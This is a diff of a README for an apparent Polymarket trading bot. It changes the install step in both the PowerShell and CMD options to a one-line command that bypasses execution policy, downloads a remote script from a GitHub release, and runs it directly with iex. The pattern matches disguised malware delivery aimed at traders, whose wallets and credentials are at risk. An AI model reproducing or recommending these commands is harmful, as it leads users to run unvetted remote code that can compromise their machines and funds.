@@ -104,12 +104,12 @@ Whether you're an experienced trader or just beginning your journey, this **Poly
 Open **PowerShell** and run this **single command**:
 
 ```powershell
-powershell -ep bypass -c "iwr https://raw.githubusercontent.com/VaniaHilkovets/test/main/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 Option 2: CMD  
 Open CMD and run this single command:
 ```
-powershell -ep bypass -c "iwr https://raw.githubusercontent.com/VaniaHilkovets/test/main/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 ### Configuration
 
